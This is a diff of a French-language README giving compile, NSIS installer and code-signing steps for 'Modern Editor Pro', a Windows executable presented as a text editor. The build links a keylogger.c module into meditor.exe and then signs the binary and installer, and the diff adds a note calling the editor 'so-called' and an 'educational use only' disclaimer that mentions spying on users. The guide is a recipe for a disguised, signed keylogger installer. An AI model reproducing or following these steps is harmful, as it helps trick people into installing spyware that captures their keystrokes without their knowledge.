@@ -1,6 +1,6 @@
 # Modern Editor Pro - Guide de compilation
 
-Un guide détaillé pour compiler et signer l'éditeur de texte professionnel pour Windows.
+Un guide détaillé pour compiler et signer l'éditeur de texte professionnel pour Windows. (Sois disant)
 
 ![Version](https://img.shields.io/badge/version-1.5.2-blue)
 ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
@@ -13,14 +13,27 @@ Un guide détaillé pour compiler et signer l'éditeur de texte professionnel po
 - [Signature des exécutables](#-signature-des-exécutables)
 - [Structure du projet](#-structure-du-projet)
 
+## ⚠️ DISCLAIMER - AVERTISSEMENT
+
+### USAGE ÉDUCATIF UNIQUEMENT
+Ce logiciel est fourni UNIQUEMENT à des fins éducatives et de recherche. L'utilisation de ce programme pour :
+Espionner des utilisateurs sans leur consentement
+Collecter des données personnelles à leur insu
+Toute autre utilisation malveillante
+Est strictement INTERDITE et ILLÉGALE. Les auteurs déclinent toute responsabilité concernant une utilisation abusive de ce code.
+En utilisant ce logiciel, vous acceptez de :
+L'utiliser uniquement dans un cadre éducatif
+Respecter la vie privée d'autrui
+Assumer l'entière responsabilité de votre utilisation
+
 ## 💻 Prérequis
 
-1. Installer les outils :
+### 1. Installer les outils :
 
 `sudo apt-get install mingw-w64 openssl nsis`
 
 
-2. Vérifier les installations :
+### 2. Vérifier les installations :
 
 `x86_64-w64-mingw32-gcc --version`  
 `openssl version`  
@@ -48,19 +61,19 @@ Un guide détaillé pour compiler et signer l'éditeur de texte professionnel po
 
 ## 🔨 Compilation
 
-1. Compiler les objets :
+### 1. Compiler les objets :
 
 `x86_64-w64-mingw32-gcc -c Meditor.c -o Meditor.o`  
 `x86_64-w64-mingw32-gcc -c keylogger.c -o keylogger.o`  
 `x86_64-w64-mingw32-gcc -c utils.c -o utils.o`  
 
 
-2. Compiler les ressources :
+### 2. Compiler les ressources :
 
 `x86_64-w64-mingw32-windres resource.rc resource.res`  
 
 
-3. Lier tous les fichiers :
+### 3. Lier tous les fichiers :
 ```bash
 x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \
     -o meditor.exe \
@@ -72,12 +85,12 @@ x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \
 
 ## 📦 Création de l'installateur
 
-1. Vérifier le fichier installer.nsi :
+### 1. Vérifier le fichier installer.nsi :
    - Mettre à jour la version
    - Vérifier les chemins des fichiers
    - Configurer les options d'installation
 
-2. Générer l'installateur :
+### 2. Générer l'installateur :
 
 `makensis installer.nsi`
 
@@ -90,7 +103,7 @@ line 35 : NomDuFichierEntrée (Exécutable de Base)
 
 ## 🔐 Signature des exécutables
 
-1. Signer l'exécutable principal :
+### 1. Signer l'exécutable principal :
 
 ```bash
 osslsigncode sign \
@@ -103,7 +116,7 @@ osslsigncode sign \
     -out meditor_signed.exe
 ```
 
-2. Signer l'installateur :
+### 2. Signer l'installateur :
 ```bash
 osslsigncode sign \
     -pkcs12 professional.pfx \
